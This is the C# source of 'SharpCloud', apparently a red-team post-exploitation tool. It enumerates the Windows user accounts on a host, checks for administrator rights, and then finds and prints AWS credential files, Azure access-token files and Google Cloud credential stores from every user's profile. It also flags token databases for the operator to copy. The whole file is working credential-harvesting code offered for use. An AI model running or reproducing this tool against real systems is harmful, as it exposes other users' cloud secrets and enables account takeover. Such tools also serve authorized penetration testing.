using System;
using System.IO;
using System.Management;
using System.Collections.Generic;
using System.Security.Principal;

namespace SharpCloud
{
    class CloudDump
    {
        // Checks if the current user has administrative privileges
        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


        // Collects usernames using Win32_UserAccount query, filters the usernames, and returns list
        public static List<string> GetUsers()
        {
            // Create two user lists to ignore select local/domain usernames that will not have credentials
            List<string> usernames = new List<string>();
            List<string> ignored_users = new List<string>();
            ignored_users.Add("DefaultAccount");
            ignored_users.Add("WDAGUtilityAccount");
            ignored_users.Add("Guest");
            ignored_users.Add("Administrator");
            ignored_users.Add("krbtgt");

            // Win32_UserAccount will return all use profiles on the host
            // If the host is unable to talk to the domain, it will miss domain account profiles
            SelectQuery sQuery = new SelectQuery("Win32_UserAccount");

            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(sQuery);
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    string strUser = Convert.ToString(mObject["Name"]);
                    if (!ignored_users.Contains(strUser))
                    {
                        usernames.Add(strUser);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            return usernames;
        }


        // Checks if the provided filename exists and returns its contents
        static void CheckFile(string filename)
        {
            if (File.Exists(filename))
            {
                Console.WriteLine(Environment.NewLine + "[*] Found {0}:", filename);
                string fileContents = File.ReadAllText(filename);
                if (filename.Contains(".db")) {
                    //string cleaned = fileContents.Substring(fileContents.IndexOf("CREATE TABLE"));
                    //Console.WriteLine(Environment.NewLine + Convert.ToString(cleaned));
                    Console.WriteLine("L.. You will want to copy this file.");
                } else
                {
                    Console.WriteLine(Environment.NewLine + Convert.ToString(fileContents));
                }
            }
        }


        // Checks if the provided command exists in the provided PATH
        static Boolean CheckCommand(string command, string path)
        {
            Boolean commandExists = false;
            if (path.Contains(command))
            {
                commandExists = true;
            }
            return commandExists;
        }


        // Prints basic usage information for the utility
        static void Usage()
        {
            Console.WriteLine(" SharpCloud can be run using one of the following commands:\r\n");
            Console.WriteLine(" .. \"SharpCloud.exe all\"    - Searches all user profiles for credentials related to all cloud services.");
            Console.WriteLine(" .. \"SharpCloud.exe aws\"    - Searches all user profiles for credentials related to Amazon Web Services.");
            Console.WriteLine(" .. \"SharpCloud.exe azure\"  - Searches all user profiles for credentials related to Microsoft Azure.");
            Console.WriteLine(" .. \"SharpCloud.exe gcloud\" - Searches all user profiles for credentials related to Google Compute.");
        }


        // Checks for files associated with AWS credentials
        static void CheckAWS(string user)
        {
            // Credential and config file locations in $HOME on Windows
            string awsKeyFile = String.Format(@"C:\Users\{0}\.aws\credentials", user);
            Console.WriteLine("[+] Checking for awscli files...");
            CheckFile(awsKeyFile);
        }


        // Checks for files associated with Azure credentials
        static void CheckAzure(string user)
        {
            // Credential and config file locations in $HOME on Windows
            string azureTokens = String.Format(@"C:\Users\{0}\.azure\accessTokens.json", user);
            string azureProfile = String.Format(@"C:\Users\{0}\.azure\azureProfile.json", user);
            Console.WriteLine(Environment.NewLine + "[+] Checking for Azure CLI files...");
            CheckFile(azureTokens);
            CheckFile(azureProfile);
        }


        // Checks for files associated with Google Compute credentials
        static void CheckGoogle(string user)
        {
            // Credential and config file locations in $HOME on Windows
            string computeLegacyCreds = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\legacy_credentials", user);
            string computeCredsDb = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\credentials.db", user);
            string computeAccessTokensDb = String.Format(@"C:\Users\{0}\AppData\Roaming\gcloud\access_tokens.db", user);
            Console.WriteLine(Environment.NewLine + "[+] Checking for Google Compute SDK files...");
            CheckFile(computeCredsDb);
            CheckFile(computeAccessTokensDb);
            if (Directory.Exists(computeLegacyCreds))
            {
                string[] legacyCreds = Directory.GetFiles(computeLegacyCreds, "*", SearchOption.AllDirectories);
                foreach (var file in legacyCreds)
                {
                    CheckFile(file);
                }
            }
        }


        // Checks for any and all credentials files
        static void CheckAll(string user)
        {
            CheckAWS(user);
            CheckAzure(user);
            CheckGoogle(user);
        }


        /**
        SharpCloud will generate a list of users, check if the current user is an administrator,
        check if any of the CLI tools are installed, and then check for credential files based on
        the command line option used.
        **/
        static void Main(string[] args)
        {
            if (args.Length != 0) {
                // Get a list of all user profiles
                List<string> allUsers = GetUsers();
                // CLI commands to search for in the user's PATH
                string azureCLI = @"Azure\CLI2";
                string computeCLI = @"google-cloud-sdk";
                string awsCLI = @"AWSCLI";
                // Get the current user
                string currentUser = Environment.UserName;
                Console.WriteLine("[+] Operating in the context of the '{0}' user.", currentUser);
                // Check if the current user is an administrator
                if (IsAdministrator())
                {
                    Console.WriteLine("[*] Current user is an Administrator!");
                } else
                {
                    Console.WriteLine("[!] Current user is NOT an Administrator! Cloud files for other users may not be returned.");
                }
                // Get the current user's PATH and check for CLI tools
                string userPath = Environment.GetEnvironmentVariable("PATH");
                Boolean awsExists = CheckCommand(awsCLI, userPath);
                Boolean computeExists = CheckCommand(computeCLI, userPath);
                Boolean azureExists = CheckCommand(azureCLI, userPath);
                if (awsExists)
                {
                    Console.WriteLine("[+] AWSCLI exists in the current user's PATH. You should be able to use 'aws' commands.");
                } else {
                    Console.WriteLine("[+] AWSCLI is not in the current user's PATH.");
                }
                if (computeExists)
                {
                    Console.WriteLine("[+] Google Compute SDK exists in the current user's PATH. You should be able to use 'gcloud' and 'gsutil' commands.");
                } else {
                    Console.WriteLine("[+] Google Compute SDK is not in the current user's PATH.");
                }
                if (azureExists)
                {
                    Console.WriteLine("[+] Azure CLI exists in the current user's PATH. You should be able to use 'az' commands.");
                } else {
                    Console.WriteLine("[+] Azure CLI is not in the current user's PATH.");
                }
                // Check the user arguments and then loop through users for checks
                foreach (string arg in args) {
                    if (string.Equals(arg, "all", StringComparison.CurrentCultureIgnoreCase)) {
                        foreach (var user in allUsers) {
                            Console.WriteLine(Environment.NewLine + "[+] Checking home directory for the {0} user:", user);
                            CheckAll(user);
                        }
                    }
                    else if (string.Equals(arg, "aws", StringComparison.CurrentCultureIgnoreCase)) {
                        foreach (var user in allUsers) {
                            Console.WriteLine(Environment.NewLine + "[+] Checking home directory for the {0} user:", user);
                            CheckAWS(user);
                        }
                    }
                    else if (string.Equals(arg, "azure", StringComparison.CurrentCultureIgnoreCase)) {
                        foreach (var user in allUsers) {
                            Console.WriteLine(Environment.NewLine + "[+] Checking home directory for the {0} user:", user);
                            CheckAzure(user);
                        }
                    }
                    else if (string.Equals(arg, "gcloud", StringComparison.CurrentCultureIgnoreCase)) {
                        foreach (var user in allUsers) {
                            Console.WriteLine(Environment.NewLine + "[+] Checking home directory for the {0} user:", user);
                            CheckGoogle(user);
                        }
                    }
                    else {
                        Usage();
                        return;
                    }
                }
                Console.WriteLine(Environment.NewLine + "[+] Job's done! Press Enter to continue.");
                Console.Read();
            }
            else {
                Usage();
                return;
            }
        }
    }
}
